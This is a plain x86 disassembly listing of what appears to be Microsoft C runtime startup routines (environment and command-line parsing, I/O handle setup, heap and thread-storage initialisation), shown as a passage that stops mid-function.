  424cac:	push   esi
  424cad:	call   0x425a40
  424cb2:	mov    ebp,eax
  424cb4:	inc    ebp
  424cb5:	cmp    BYTE PTR [esi],0x3d
  424cb8:	pop    ecx
  424cb9:	je     0x424cd4
  424cbb:	push   ebp
  424cbc:	call   0x426152
  424cc1:	cmp    eax,ebx
  424cc3:	pop    ecx
  424cc4:	mov    DWORD PTR [edi],eax
  424cc6:	je     0x424cff
  424cc8:	push   esi
  424cc9:	push   eax
  424cca:	call   0x425810
  424ccf:	pop    ecx
  424cd0:	pop    ecx
  424cd1:	add    edi,0x4
  424cd4:	add    esi,ebp
  424cd6:	cmp    BYTE PTR [esi],bl
  424cd8:	jne    0x424cac
  424cda:	push   DWORD PTR ds:0x4635b4
  424ce0:	call   0x42603a
  424ce5:	mov    DWORD PTR ds:0x4635b4,ebx
  424ceb:	mov    DWORD PTR [edi],ebx
  424ced:	mov    DWORD PTR ds:0x463d60,0x1
  424cf7:	xor    eax,eax
  424cf9:	pop    ecx
  424cfa:	pop    ebp
  424cfb:	pop    edi
  424cfc:	pop    esi
  424cfd:	pop    ebx
  424cfe:	ret    
  424cff:	push   DWORD PTR ds:0x4635e4
  424d05:	call   0x42603a
  424d0a:	mov    DWORD PTR ds:0x4635e4,ebx
  424d10:	or     eax,0xffffffff
  424d13:	jmp    0x424cf9
  424d15:	push   ebp
  424d16:	mov    ebp,esp
  424d18:	push   ecx
  424d19:	push   ebx
  424d1a:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1d:	xor    edx,edx
  424d1f:	cmp    DWORD PTR [ebp+0x8],edx
  424d22:	push   edi
  424d23:	mov    DWORD PTR [esi],edx
  424d25:	mov    edi,ecx
  424d27:	mov    DWORD PTR [ebx],0x1
  424d2d:	je     0x424d38
  424d2f:	mov    ecx,DWORD PTR [ebp+0x8]
  424d32:	add    DWORD PTR [ebp+0x8],0x4
  424d36:	mov    DWORD PTR [ecx],edi
  424d38:	cmp    BYTE PTR [eax],0x22
  424d3b:	jne    0x424d4b
  424d3d:	xor    ecx,ecx
  424d3f:	test   edx,edx
  424d41:	sete   cl
  424d44:	inc    eax
  424d45:	mov    edx,ecx
  424d47:	mov    cl,0x22
  424d49:	jmp    0x424d78
  424d4b:	inc    DWORD PTR [esi]
  424d4d:	test   edi,edi
  424d4f:	je     0x424d56
  424d51:	mov    cl,BYTE PTR [eax]
  424d53:	mov    BYTE PTR [edi],cl
  424d55:	inc    edi
  424d56:	mov    cl,BYTE PTR [eax]
  424d58:	movzx  ebx,cl
  424d5b:	inc    eax
  424d5c:	test   BYTE PTR [ebx+0x463a21],0x4
  424d63:	je     0x424d71
  424d65:	inc    DWORD PTR [esi]
  424d67:	test   edi,edi
  424d69:	je     0x424d70
  424d6b:	mov    bl,BYTE PTR [eax]
  424d6d:	mov    BYTE PTR [edi],bl
  424d6f:	inc    edi
  424d70:	inc    eax
  424d71:	test   cl,cl
  424d73:	mov    ebx,DWORD PTR [ebp+0xc]
  424d76:	je     0x424daa
  424d78:	test   edx,edx
  424d7a:	jne    0x424d38
  424d7c:	cmp    cl,0x20
  424d7f:	je     0x424d86
  424d81:	cmp    cl,0x9
  424d84:	jne    0x424d38
  424d86:	test   edi,edi
  424d88:	je     0x424d8e
  424d8a:	and    BYTE PTR [edi-0x1],0x0
  424d8e:	and    DWORD PTR [ebp-0x4],0x0
  424d92:	cmp    BYTE PTR [eax],0x0
  424d95:	je     0x424e71
  424d9b:	mov    cl,BYTE PTR [eax]
  424d9d:	cmp    cl,0x20
  424da0:	je     0x424da7
  424da2:	cmp    cl,0x9
  424da5:	jne    0x424dad
  424da7:	inc    eax
  424da8:	jmp    0x424d9b
  424daa:	dec    eax
  424dab:	jmp    0x424d8e
  424dad:	cmp    BYTE PTR [eax],0x0
  424db0:	je     0x424e71
  424db6:	cmp    DWORD PTR [ebp+0x8],0x0
  424dba:	je     0x424dc5
  424dbc:	mov    ecx,DWORD PTR [ebp+0x8]
  424dbf:	add    DWORD PTR [ebp+0x8],0x4
  424dc3:	mov    DWORD PTR [ecx],edi
  424dc5:	inc    DWORD PTR [ebx]
  424dc7:	xor    ebx,ebx
  424dc9:	inc    ebx
  424dca:	xor    edx,edx
  424dcc:	jmp    0x424dd0
  424dce:	inc    eax
  424dcf:	inc    edx
  424dd0:	cmp    BYTE PTR [eax],0x5c
  424dd3:	je     0x424dce
  424dd5:	cmp    BYTE PTR [eax],0x22
  424dd8:	jne    0x424e00
  424dda:	test   dl,0x1
  424ddd:	jne    0x424dfe
  424ddf:	cmp    DWORD PTR [ebp-0x4],0x0
  424de3:	je     0x424df1
  424de5:	lea    ecx,[eax+0x1]
  424de8:	cmp    BYTE PTR [ecx],0x22
  424deb:	jne    0x424df1
  424ded:	mov    eax,ecx
  424def:	jmp    0x424df3
  424df1:	xor    ebx,ebx
  424df3:	xor    ecx,ecx
  424df5:	cmp    DWORD PTR [ebp-0x4],ecx
  424df8:	sete   cl
  424dfb:	mov    DWORD PTR [ebp-0x4],ecx
  424dfe:	shr    edx,1
  424e00:	test   edx,edx
  424e02:	je     0x424e11
  424e04:	test   edi,edi
  424e06:	je     0x424e0c
  424e08:	mov    BYTE PTR [edi],0x5c
  424e0b:	inc    edi
  424e0c:	inc    DWORD PTR [esi]
  424e0e:	dec    edx
  424e0f:	jne    0x424e04
  424e11:	mov    cl,BYTE PTR [eax]
  424e13:	test   cl,cl
  424e15:	je     0x424e5f
  424e17:	cmp    DWORD PTR [ebp-0x4],0x0
  424e1b:	jne    0x424e27
  424e1d:	cmp    cl,0x20
  424e20:	je     0x424e5f
  424e22:	cmp    cl,0x9
  424e25:	je     0x424e5f
  424e27:	test   ebx,ebx
  424e29:	je     0x424e59
  424e2b:	test   edi,edi
  424e2d:	je     0x424e48
  424e2f:	movzx  edx,cl
  424e32:	test   BYTE PTR [edx+0x463a21],0x4
  424e39:	je     0x424e41
  424e3b:	mov    BYTE PTR [edi],cl
  424e3d:	inc    edi
  424e3e:	inc    eax
  424e3f:	inc    DWORD PTR [esi]
  424e41:	mov    cl,BYTE PTR [eax]
  424e43:	mov    BYTE PTR [edi],cl
  424e45:	inc    edi
  424e46:	jmp    0x424e57
  424e48:	movzx  ecx,cl
  424e4b:	test   BYTE PTR [ecx+0x463a21],0x4
  424e52:	je     0x424e57
  424e54:	inc    eax
  424e55:	inc    DWORD PTR [esi]
  424e57:	inc    DWORD PTR [esi]
  424e59:	inc    eax
  424e5a:	jmp    0x424dc7
  424e5f:	test   edi,edi
  424e61:	je     0x424e67
  424e63:	and    BYTE PTR [edi],0x0
  424e66:	inc    edi
  424e67:	inc    DWORD PTR [esi]
  424e69:	mov    ebx,DWORD PTR [ebp+0xc]
  424e6c:	jmp    0x424d92
  424e71:	mov    eax,DWORD PTR [ebp+0x8]
  424e74:	test   eax,eax
  424e76:	je     0x424e7b
  424e78:	and    DWORD PTR [eax],0x0
  424e7b:	inc    DWORD PTR [ebx]
  424e7d:	pop    edi
  424e7e:	pop    ebx
  424e7f:	leave  
  424e80:	ret    
  424e81:	push   ebp
  424e82:	mov    ebp,esp
  424e84:	push   ecx
  424e85:	push   ecx
  424e86:	push   ebx
  424e87:	push   esi
  424e88:	push   edi
  424e89:	xor    edi,edi
  424e8b:	cmp    DWORD PTR ds:0x463d6c,edi
  424e91:	jne    0x424e98
  424e93:	call   0x42601c
  424e98:	and    BYTE PTR ds:0x463714,0x0
  424e9f:	push   0x104
  424ea4:	mov    esi,0x463610
  424ea9:	push   esi
  424eaa:	push   edi
  424eab:	call   DWORD PTR ds:0x4290a8
  424eb1:	mov    eax,ds:0x463d74
  424eb6:	cmp    eax,edi
  424eb8:	mov    DWORD PTR ds:0x4635f4,esi
  424ebe:	je     0x424ec7
  424ec0:	cmp    BYTE PTR [eax],0x0
  424ec3:	mov    ebx,eax
  424ec5:	jne    0x424ec9
  424ec7:	mov    ebx,esi
  424ec9:	lea    eax,[ebp-0x4]
  424ecc:	push   eax
  424ecd:	push   edi
  424ece:	lea    esi,[ebp-0x8]
  424ed1:	xor    ecx,ecx
  424ed3:	mov    eax,ebx
  424ed5:	call   0x424d15
  424eda:	mov    esi,DWORD PTR [ebp-0x4]
  424edd:	mov    eax,DWORD PTR [ebp-0x8]
  424ee0:	shl    esi,0x2
  424ee3:	add    eax,esi
  424ee5:	push   eax
  424ee6:	call   0x426152
  424eeb:	mov    edi,eax
  424eed:	add    esp,0xc
  424ef0:	test   edi,edi
  424ef2:	jne    0x424ef9
  424ef4:	or     eax,0xffffffff
  424ef7:	jmp    0x424f1e
  424ef9:	lea    eax,[ebp-0x4]
  424efc:	push   eax
  424efd:	lea    ecx,[esi+edi*1]
  424f00:	push   edi
  424f01:	lea    esi,[ebp-0x8]
  424f04:	mov    eax,ebx
  424f06:	call   0x424d15
  424f0b:	mov    eax,DWORD PTR [ebp-0x4]
  424f0e:	dec    eax
  424f0f:	pop    ecx
  424f10:	mov    ds:0x4635d8,eax
  424f15:	pop    ecx
  424f16:	mov    DWORD PTR ds:0x4635dc,edi
  424f1c:	xor    eax,eax
  424f1e:	pop    edi
  424f1f:	pop    esi
  424f20:	pop    ebx
  424f21:	leave  
  424f22:	ret    
  424f23:	push   ecx
  424f24:	push   ecx
  424f25:	mov    eax,ds:0x463718
  424f2a:	push   ebx
  424f2b:	push   ebp
  424f2c:	push   esi
  424f2d:	push   edi
  424f2e:	mov    edi,DWORD PTR ds:0x4290c0
  424f34:	xor    ebx,ebx
  424f36:	xor    esi,esi
  424f38:	cmp    eax,ebx
  424f3a:	push   0x2
  424f3c:	pop    ebp
  424f3d:	jne    0x424f6c
  424f3f:	call   edi
  424f41:	mov    esi,eax
  424f43:	cmp    esi,ebx
  424f45:	je     0x424f53
  424f47:	mov    DWORD PTR ds:0x463718,0x1
  424f51:	jmp    0x424f71
  424f53:	call   DWORD PTR ds:0x429030
  424f59:	cmp    eax,0x78
  424f5c:	jne    0x424f67
  424f5e:	mov    eax,ebp
  424f60:	mov    ds:0x463718,eax
  424f65:	jmp    0x424f6c
  424f67:	mov    eax,ds:0x463718
  424f6c:	cmp    eax,0x1
  424f6f:	jne    0x424fee
  424f71:	cmp    esi,ebx
  424f73:	jne    0x424f7d
  424f75:	call   edi
  424f77:	mov    esi,eax
  424f79:	cmp    esi,ebx
  424f7b:	je     0x424ff6
  424f7d:	cmp    WORD PTR [esi],bx
  424f80:	mov    eax,esi
  424f82:	je     0x424f92
  424f84:	add    eax,ebp
  424f86:	cmp    WORD PTR [eax],bx
  424f89:	jne    0x424f84
  424f8b:	add    eax,ebp
  424f8d:	cmp    WORD PTR [eax],bx
  424f90:	jne    0x424f84
  424f92:	mov    edi,DWORD PTR ds:0x4290bc
  424f98:	push   ebx
  424f99:	push   ebx
  424f9a:	push   ebx
  424f9b:	sub    eax,esi
  424f9d:	push   ebx
  424f9e:	sar    eax,1
  424fa0:	inc    eax
  424fa1:	push   eax
  424fa2:	push   esi
  424fa3:	push   ebx
  424fa4:	push   ebx
  424fa5:	mov    DWORD PTR [esp+0x34],eax
  424fa9:	call   edi
  424fab:	mov    ebp,eax
  424fad:	cmp    ebp,ebx
  424faf:	je     0x424fe3
  424fb1:	push   ebp
  424fb2:	call   0x426152
  424fb7:	cmp    eax,ebx
  424fb9:	pop    ecx
  424fba:	mov    DWORD PTR [esp+0x10],eax
  424fbe:	je     0x424fe3
  424fc0:	push   ebx
  424fc1:	push   ebx
  424fc2:	push   ebp
  424fc3:	push   eax
  424fc4:	push   DWORD PTR [esp+0x24]
  424fc8:	push   esi
  424fc9:	push   ebx
  424fca:	push   ebx
  424fcb:	call   edi
  424fcd:	test   eax,eax
  424fcf:	jne    0x424fdf
  424fd1:	push   DWORD PTR [esp+0x10]
  424fd5:	call   0x42603a
  424fda:	pop    ecx
  424fdb:	mov    DWORD PTR [esp+0x10],ebx
  424fdf:	mov    ebx,DWORD PTR [esp+0x10]
  424fe3:	push   esi
  424fe4:	call   DWORD PTR ds:0x4290b8
  424fea:	mov    eax,ebx
  424fec:	jmp    0x42503e
  424fee:	cmp    eax,ebp
  424ff0:	je     0x424ffa
  424ff2:	cmp    eax,ebx
  424ff4:	je     0x424ffa
  424ff6:	xor    eax,eax
  424ff8:	jmp    0x42503e
  424ffa:	call   DWORD PTR ds:0x4290b4
  425000:	mov    esi,eax
  425002:	cmp    esi,ebx
  425004:	je     0x424ff6
  425006:	cmp    BYTE PTR [esi],bl
  425008:	je     0x425014
  42500a:	inc    eax
  42500b:	cmp    BYTE PTR [eax],bl
  42500d:	jne    0x42500a
  42500f:	inc    eax
  425010:	cmp    BYTE PTR [eax],bl
  425012:	jne    0x42500a
  425014:	sub    eax,esi
  425016:	inc    eax
  425017:	mov    ebp,eax
  425019:	push   ebp
  42501a:	call   0x426152
  42501f:	mov    edi,eax
  425021:	cmp    edi,ebx
  425023:	pop    ecx
  425024:	jne    0x42502a
  425026:	xor    edi,edi
  425028:	jmp    0x425035
  42502a:	push   ebp
  42502b:	push   esi
  42502c:	push   edi
  42502d:	call   0x426170
  425032:	add    esp,0xc
  425035:	push   esi
  425036:	call   DWORD PTR ds:0x4290b0
  42503c:	mov    eax,edi
  42503e:	pop    edi
  42503f:	pop    esi
  425040:	pop    ebp
  425041:	pop    ebx
  425042:	pop    ecx
  425043:	pop    ecx
  425044:	ret    
  425045:	sub    esp,0x48
  425048:	push   ebx
  425049:	mov    ebx,0x480
  42504e:	push   ebx
  42504f:	call   0x426152
  425054:	test   eax,eax
  425056:	pop    ecx
  425057:	jne    0x425061
  425059:	or     eax,0xffffffff
  42505c:	jmp    0x42523e
  425061:	mov    ds:0x463c60,eax
  425066:	mov    DWORD PTR ds:0x463c48,0x20
  425070:	lea    ecx,[eax+0x480]
  425076:	jmp    0x425096
  425078:	and    BYTE PTR [eax+0x4],0x0
  42507c:	or     DWORD PTR [eax],0xffffffff
  42507f:	and    DWORD PTR [eax+0x8],0x0
  425083:	mov    BYTE PTR [eax+0x5],0xa
  425087:	mov    ecx,DWORD PTR ds:0x463c60
  42508d:	add    eax,0x24
  425090:	add    ecx,0x480
  425096:	cmp    eax,ecx
  425098:	jb     0x425078
  42509a:	push   ebp
  42509b:	push   esi
  42509c:	push   edi
  42509d:	lea    eax,[esp+0x14]
  4250a1:	push   eax
  4250a2:	call   DWORD PTR ds:0x429090
  4250a8:	cmp    WORD PTR [esp+0x46],0x0
  4250ae:	je     0x42519d
  4250b4:	mov    eax,DWORD PTR [esp+0x48]
  4250b8:	test   eax,eax
  4250ba:	je     0x42519d
  4250c0:	mov    edi,DWORD PTR [eax]
  4250c2:	lea    ebp,[eax+0x4]
  4250c5:	lea    eax,[edi+ebp*1]
  4250c8:	mov    DWORD PTR [esp+0x10],eax
  4250cc:	mov    eax,0x800
  4250d1:	cmp    edi,eax
  4250d3:	jl     0x4250d7
  4250d5:	mov    edi,eax
  4250d7:	cmp    DWORD PTR ds:0x463c48,edi
  4250dd:	jge    0x42512d
  4250df:	mov    esi,0x463c64
  4250e4:	push   ebx
  4250e5:	call   0x426152
  4250ea:	test   eax,eax
  4250ec:	pop    ecx
  4250ed:	je     0x425127
  4250ef:	add    DWORD PTR ds:0x463c48,0x20
  4250f6:	mov    DWORD PTR [esi],eax
  4250f8:	lea    ecx,[eax+0x480]
  4250fe:	jmp    0x425116
  425100:	and    BYTE PTR [eax+0x4],0x0
  425104:	or     DWORD PTR [eax],0xffffffff
  425107:	and    DWORD PTR [eax+0x8],0x0
  42510b:	mov    BYTE PTR [eax+0x5],0xa
  42510f:	mov    ecx,DWORD PTR [esi]
  425111:	add    eax,0x24
  425114:	add    ecx,ebx
  425116:	cmp    eax,ecx
  425118:	jb     0x425100
  42511a:	add    esi,0x4
  42511d:	cmp    DWORD PTR ds:0x463c48,edi
  425123:	jl     0x4250e4
  425125:	jmp    0x42512d
  425127:	mov    edi,DWORD PTR ds:0x463c48
  42512d:	xor    ebx,ebx
  42512f:	test   edi,edi
  425131:	jle    0x42519d
  425133:	mov    eax,DWORD PTR [esp+0x10]
  425137:	mov    eax,DWORD PTR [eax]
  425139:	cmp    eax,0xffffffff
  42513c:	je     0x425192
  42513e:	mov    cl,BYTE PTR [ebp+0x0]
  425141:	test   cl,0x1
  425144:	je     0x425192
  425146:	test   cl,0x8
  425149:	jne    0x425156
  42514b:	push   eax
  42514c:	call   DWORD PTR ds:0x4290c8
  425152:	test   eax,eax
  425154:	je     0x425192
  425156:	mov    ecx,ebx
  425158:	mov    eax,ebx
  42515a:	and    eax,0x1f
  42515d:	lea    eax,[eax+eax*8]
  425160:	sar    ecx,0x5
  425163:	mov    ecx,DWORD PTR [ecx*4+0x463c60]
  42516a:	lea    esi,[ecx+eax*4]
  42516d:	mov    eax,DWORD PTR [esp+0x10]
  425171:	mov    eax,DWORD PTR [eax]
  425173:	mov    DWORD PTR [esi],eax
  425175:	mov    al,BYTE PTR [ebp+0x0]
  425178:	mov    BYTE PTR [esi+0x4],al
  42517b:	lea    eax,[esi+0xc]
  42517e:	push   0xfa0
  425183:	push   eax
  425184:	call   0x4264bd
  425189:	test   eax,eax
  42518b:	pop    ecx
  42518c:	pop    ecx
  42518d:	je     0x4251bd
  42518f:	inc    DWORD PTR [esi+0x8]
  425192:	add    DWORD PTR [esp+0x10],0x4
  425197:	inc    ebx
  425198:	inc    ebp
  425199:	cmp    ebx,edi
  42519b:	jl     0x425133
  42519d:	xor    ebx,ebx
  42519f:	mov    ecx,DWORD PTR ds:0x463c60
  4251a5:	lea    eax,[ebx+ebx*8]
  4251a8:	lea    esi,[ecx+eax*4]
  4251ab:	cmp    DWORD PTR [esi],0xffffffff
  4251ae:	jne    0x42521f
  4251b0:	test   ebx,ebx
  4251b2:	mov    BYTE PTR [esi+0x4],0x81
  4251b6:	jne    0x4251c2
  4251b8:	push   0xfffffff6
  4251ba:	pop    eax
  4251bb:	jmp    0x4251cc
  4251bd:	or     eax,0xffffffff
  4251c0:	jmp    0x42523b
  4251c2:	mov    eax,ebx
  4251c4:	dec    eax
  4251c5:	neg    eax
  4251c7:	sbb    eax,eax
  4251c9:	add    eax,0xfffffff5
  4251cc:	push   eax
  4251cd:	call   DWORD PTR ds:0x4290a4
  4251d3:	mov    edi,eax
  4251d5:	cmp    edi,0xffffffff
  4251d8:	je     0x425219
  4251da:	push   edi
  4251db:	call   DWORD PTR ds:0x4290c8
  4251e1:	test   eax,eax
  4251e3:	je     0x425219
  4251e5:	and    eax,0xff
  4251ea:	cmp    eax,0x2
  4251ed:	mov    DWORD PTR [esi],edi
  4251ef:	jne    0x4251f7
  4251f1:	or     BYTE PTR [esi+0x4],0x40
  4251f5:	jmp    0x425200
  4251f7:	cmp    eax,0x3
  4251fa:	jne    0x425200
  4251fc:	or     BYTE PTR [esi+0x4],0x8
  425200:	lea    eax,[esi+0xc]
  425203:	push   0xfa0
  425208:	push   eax
  425209:	call   0x4264bd
  42520e:	test   eax,eax
  425210:	pop    ecx
  425211:	pop    ecx
  425212:	je     0x4251bd
  425214:	inc    DWORD PTR [esi+0x8]
  425217:	jmp    0x425223
  425219:	or     BYTE PTR [esi+0x4],0x40
  42521d:	jmp    0x425223
  42521f:	or     BYTE PTR [esi+0x4],0x80
  425223:	inc    ebx
  425224:	cmp    ebx,0x3
  425227:	jl     0x42519f
  42522d:	push   DWORD PTR ds:0x463c48
  425233:	call   DWORD PTR ds:0x4290c4
  425239:	xor    eax,eax
  42523b:	pop    edi
  42523c:	pop    esi
  42523d:	pop    ebp
  42523e:	pop    ebx
  42523f:	add    esp,0x48
  425242:	ret    
  425243:	push   0xc
  425245:	push   0x4295f8
  42524a:	call   0x425434
  42524f:	mov    DWORD PTR [ebp-0x1c],0x42a050
  425256:	cmp    DWORD PTR [ebp-0x1c],0x42a050
  42525d:	jae    0x425281
  42525f:	and    DWORD PTR [ebp-0x4],0x0
  425263:	mov    eax,DWORD PTR [ebp-0x1c]
  425266:	mov    eax,DWORD PTR [eax]
  425268:	test   eax,eax
  42526a:	je     0x425277
  42526c:	call   eax
  42526e:	jmp    0x425277
  425270:	xor    eax,eax
  425272:	inc    eax
  425273:	ret    
  425274:	mov    esp,DWORD PTR [ebp-0x18]
  425277:	or     DWORD PTR [ebp-0x4],0xffffffff
  42527b:	add    DWORD PTR [ebp-0x1c],0x4
  42527f:	jmp    0x425256
  425281:	call   0x42546f
  425286:	ret    
  425287:	push   0xc
  425289:	push   0x429608
  42528e:	call   0x425434
  425293:	mov    DWORD PTR [ebp-0x1c],0x42a058
  42529a:	cmp    DWORD PTR [ebp-0x1c],0x42a058
  4252a1:	jae    0x4252c5
  4252a3:	and    DWORD PTR [ebp-0x4],0x0
  4252a7:	mov    eax,DWORD PTR [ebp-0x1c]
  4252aa:	mov    eax,DWORD PTR [eax]
  4252ac:	test   eax,eax
  4252ae:	je     0x4252bb
  4252b0:	call   eax
  4252b2:	jmp    0x4252bb
  4252b4:	xor    eax,eax
  4252b6:	inc    eax
  4252b7:	ret    
  4252b8:	mov    esp,DWORD PTR [ebp-0x18]
  4252bb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4252bf:	add    DWORD PTR [ebp-0x1c],0x4
  4252c3:	jmp    0x42529a
  4252c5:	call   0x42546f
  4252ca:	ret    
  4252cb:	call   0x425506
  4252d0:	mov    eax,ds:0x462dfc
  4252d5:	cmp    eax,0xffffffff
  4252d8:	je     0x4252e8
  4252da:	push   eax
  4252db:	call   DWORD PTR ds:0x4290d0
  4252e1:	or     DWORD PTR ds:0x462dfc,0xffffffff
  4252e8:	ret    
  4252e9:	push   ebx
  4252ea:	push   esi
  4252eb:	call   DWORD PTR ds:0x429030
  4252f1:	push   DWORD PTR ds:0x462dfc
  4252f7:	mov    ebx,eax
  4252f9:	call   DWORD PTR ds:0x4290e0
  4252ff:	mov    esi,eax
  425301:	test   esi,esi
  425303:	jne    0x42534e
  425305:	push   0x88
  42530a:	push   0x1
  42530c:	call   0x426548
  425311:	mov    esi,eax
  425313:	test   esi,esi
  425315:	pop    ecx
  425316:	pop    ecx
  425317:	je     0x425346
  425319:	push   esi
  42531a:	push   DWORD PTR ds:0x462dfc
  425320:	call   DWORD PTR ds:0x4290dc
  425326:	test   eax,eax
  425328:	je     0x425346
  42532a:	mov    DWORD PTR [esi+0x54],0x462d50
  425331:	mov    DWORD PTR [esi+0x14],0x1
  425338:	call   DWORD PTR ds:0x4290d8
  42533e:	or     DWORD PTR [esi+0x4],0xffffffff
  425342:	mov    DWORD PTR [esi],eax
  425344:	jmp    0x42534e
  425346:	push   0x10
  425348:	call   0x4244fc
  42534d:	pop    ecx
  42534e:	push   ebx
  42534f:	call   DWORD PTR ds:0x4290d4
  425355:	mov    eax,esi
  425357:	pop    esi
  425358:	pop    ebx
  425359:	ret    
  42535a:	call   0x4254bd
  42535f:	test   eax,eax
  425361:	je     0x425373
  425363:	call   DWORD PTR ds:0x4290e4
  425369:	cmp    eax,0xffffffff
  42536c:	mov    ds:0x462dfc,eax
  425371:	jne    0x42537b
  425373:	call   0x4252cb
  425378:	xor    eax,eax
  42537a:	ret    
  42537b:	push   esi
  42537c:	push   0x88
  425381:	push   0x1
  425383:	call   0x426548
  425388:	mov    esi,eax
  42538a:	test   esi,esi
  42538c:	pop    ecx
  42538d:	pop    ecx
  42538e:	je     0x4253c0
  425390:	push   esi
  425391:	push   DWORD PTR ds:0x462dfc
  425397:	call   DWORD PTR ds:0x4290dc
  42539d:	test   eax,eax
  42539f:	je     0x4253c0
  4253a1:	mov    DWORD PTR [esi+0x54],0x462d50
  4253a8:	mov    DWORD PTR [esi+0x14],0x1
  4253af:	call   DWORD PTR ds:0x4290d8
  4253b5:	or     DWORD PTR [esi+0x4],0xffffffff
  4253b9:	mov    DWORD PTR [esi],eax
  4253bb:	xor    eax,eax
  4253bd:	inc    eax
  4253be:	pop    esi
  4253bf:	ret    
  4253c0:	call   0x4252cb
  4253c5:	xor    eax,eax
  4253c7:	pop    esi
  4253c8:	ret    
  4253c9:	cmp    DWORD PTR ds:0x4635c4,0x2
  4253d0:	jne    0x4253df
  4253d2:	cmp    DWORD PTR ds:0x4635d0,0x5
  4253d9:	jb     0x4253df
  4253db:	xor    eax,eax
  4253dd:	inc    eax
  4253de:	ret    
  4253df:	push   0x3
  4253e1:	pop    eax
  4253e2:	ret    
  4253e3:	xor    eax,eax
  4253e5:	cmp    DWORD PTR [esp+0x4],eax
  4253e9:	push   0x0
  4253eb:	sete   al
  4253ee:	push   0x1000
  4253f3:	push   eax
  4253f4:	call   DWORD PTR ds:0x429040
  4253fa:	test   eax,eax
  4253fc:	mov    ds:0x463c40,eax
  425401:	je     0x42542d
  425403:	call   0x4253c9
  425408:	cmp    eax,0x3
  42540b:	mov    ds:0x463c44,eax
  425410:	jne    0x425430
  425412:	push   0x3f8
  425417:	call   0x4267ca
  42541c:	test   eax,eax
  42541e:	pop    ecx
  42541f:	jne    0x425430
  425421:	push   DWORD PTR ds:0x463c40
  425427:	call   DWORD PTR ds:0x4290e8
  42542d:	xor    eax,eax
  42542f:	ret    
  425430:	xor    eax,eax
  425432:	inc    eax
  425433:	ret    
  425434:	push   0x4272f8
  425439:	mov    eax,fs:0x0
  42543f:	push   eax
  425440:	mov    eax,DWORD PTR [esp+0x10]
  425444:	mov    DWORD PTR [esp+0x10],ebp
  425448:	lea    ebp,[esp+0x10]
  42544c:	sub    esp,eax
  42544e:	push   ebx
  42544f:	push   esi
  425450:	push   edi
  425451:	mov    eax,DWORD PTR [ebp-0x8]
  425454:	mov    DWORD PTR [ebp-0x18],esp
  425457:	push   eax
  425458:	mov    eax,DWORD PTR [ebp-0x4]
  42545b:	mov    DWORD PTR [ebp-0x4],0xffffffff
  425462:	mov    DWORD PTR [ebp-0x8],eax
  425465:	lea    eax,[ebp-0x10]
  425468:	mov    fs:0x0,eax
  42546e:	ret    
  42546f:	mov    ecx,DWORD PTR [ebp-0x10]
  425472:	mov    DWORD PTR fs:0x0,ecx
  425479:	pop    ecx
  42547a:	pop    edi
  42547b:	pop    esi
  42547c:	pop    ebx
  42547d:	leave  
  42547e:	push   ecx
  42547f:	ret    
  425480:	cmp    eax,0x1000
  425485:	jae    0x425495
  425487:	neg    eax
  425489:	add    eax,esp
  42548b:	add    eax,0x4
  42548e:	test   DWORD PTR [eax],eax
  425490:	xchg   esp,eax
  425491:	mov    eax,DWORD PTR [eax]
  425493:	push   eax
  425494:	ret    
  425495:	push   ecx
  425496:	lea    ecx,[esp+0x8]
  42549a:	sub    ecx,0x1000
  4254a0:	sub    eax,0x1000
  4254a5:	test   DWORD PTR [ecx],eax
  4254a7:	cmp    eax,0x1000
  4254ac:	jae    0x42549a
  4254ae:	sub    ecx,eax
  4254b0:	mov    eax,esp
  4254b2:	test   DWORD PTR [ecx],eax
  4254b4:	mov    esp,ecx
  4254b6:	mov    ecx,DWORD PTR [eax]
  4254b8:	mov    eax,DWORD PTR [eax+0x4]
  4254bb:	push   eax
  4254bc:	ret    
  4254bd:	push   esi
  4254be:	push   edi
  4254bf:	xor    esi,esi
  4254c1:	mov    edi,0x463720
  4254c6:	cmp    DWORD PTR [esi*8+0x462e14],0x1
  4254ce:	jne    0x4254ee
  4254d0:	lea    eax,[esi*8+0x462e10]
  4254d7:	mov    DWORD PTR [eax],edi
  4254d9:	push   0xfa0
  4254de:	push   DWORD PTR [eax]
  4254e0:	add    edi,0x18
  4254e3:	call   0x4264bd
  4254e8:	test   eax,eax
  4254ea:	pop    ecx
  4254eb:	pop    ecx
  4254ec:	je     0x4254fa
  4254ee:	inc    esi
  4254ef:	cmp    esi,0x24
  4254f2:	jl     0x4254c6
  4254f4:	xor    eax,eax
  4254f6:	inc    eax
  4254f7:	pop    edi
  4254f8:	pop    esi
  4254f9:	ret    
  4254fa:	and    DWORD PTR [esi*8+0x462e10],0x0
  425502:	xor    eax,eax
  425504:	jmp    0x4254f7
  425506:	push   ebx
  425507:	mov    ebx,DWORD PTR ds:0x4290cc
  42550d:	push   esi
  42550e:	mov    esi,0x462e10
  425513:	push   edi
  425514:	mov    edi,DWORD PTR [esi]
  425516:	test   edi,edi
  425518:	je     0x42552d
  42551a:	cmp    DWORD PTR [esi+0x4],0x1
  42551e:	je     0x42552d
  425520:	push   edi
  425521:	call   ebx
  425523:	push   edi
  425524:	call   0x42603a
  425529:	and    DWORD PTR [esi],0x0
  42552c:	pop    ecx
  42552d:	add    esi,0x8
  425530:	cmp    esi,0x462f30
  425536:	jl     0x425514
  425538:	mov    esi,0x462e10
  42553d:	pop    edi
  42553e:	mov    eax,DWORD PTR [esi]
  425540:	test   eax,eax
  425542:	je     0x42554d
  425544:	cmp    DWORD PTR [esi+0x4],0x1
  425548:	jne    0x42554d
  42554a:	push   eax
  42554b:	call   ebx
  42554d:	add    esi,0x8
  425550:	cmp    esi,0x462f30
  425556:	jl     0x42553e
  425558:	pop    esi
  425559:	pop    ebx
  42555a:	ret    
  42555b:	push   ebp
  42555c:	mov    ebp,esp
  42555e:	mov    eax,DWORD PTR [ebp+0x8]
  425561:	push   DWORD PTR [eax*8+0x462e10]
  425568:	call   DWORD PTR ds:0x4290f0
  42556e:	pop    ebp
  42556f:	ret    
  425570:	push   ebp
  425571:	mov    ebp,esp
  425573:	push   esi
  425574:	mov    esi,DWORD PTR [ebp+0x8]
  425577:	lea    esi,[esi*8+0x462e10]
  42557e:	cmp    DWORD PTR [esi],0x0
  425581:	je     0x425588
  425583:	xor    eax,eax
  425585:	inc    eax
  425586:	jmp    0x4255ec
  425588:	push   edi
  425589:	push   0x18
  42558b:	call   0x426152
  425590:	mov    edi,eax
  425592:	test   edi,edi
  425594:	pop    ecx
  425595:	jne    0x4255a6
  425597:	call   0x4273d0
  42559c:	mov    DWORD PTR [eax],0xc
  4255a2:	xor    eax,eax
